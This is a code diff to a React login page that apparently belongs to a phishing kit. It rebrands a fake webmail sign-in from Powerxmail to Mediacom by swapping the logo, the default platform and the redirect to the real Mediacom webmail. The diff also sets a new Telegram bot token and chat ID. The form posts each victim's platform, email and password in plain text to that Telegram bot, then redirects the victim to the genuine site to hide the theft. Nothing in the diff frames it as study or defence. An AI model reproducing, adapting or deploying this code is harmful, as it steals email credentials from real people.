@@ -7,6 +7,7 @@ import { useState } from 'react';
 import axios from 'axios';
 import comporium from './comporium.png';
 import powerx from './powerx.png';
+import mediacom from './mediacom.png';
 
 function Home(){
 
@@ -14,7 +15,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Powerxmail")
+    const[platform, setPlatform] = useState("Mediacom")
 
     const[showError, setShowError] = useState(false);
 
@@ -29,8 +30,8 @@ function Home(){
             //     platform:platform
             // });
     
-           const response =  await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                chat_id: 5916570239,
+            const response = await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                chat_id: 5868304053,
                 text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
               });
     
@@ -42,7 +43,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://mail.powerxmail.com/';
+               window.location.href = 'https://mail1.mediacombb.net/';
             }
           } catch (error) {
             // Handle error
@@ -67,7 +68,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv px-3'>
-                <img src={powerx} className="mylogo" />
+                <img src={mediacom} className="mylogo" />
 
                 </div>
 
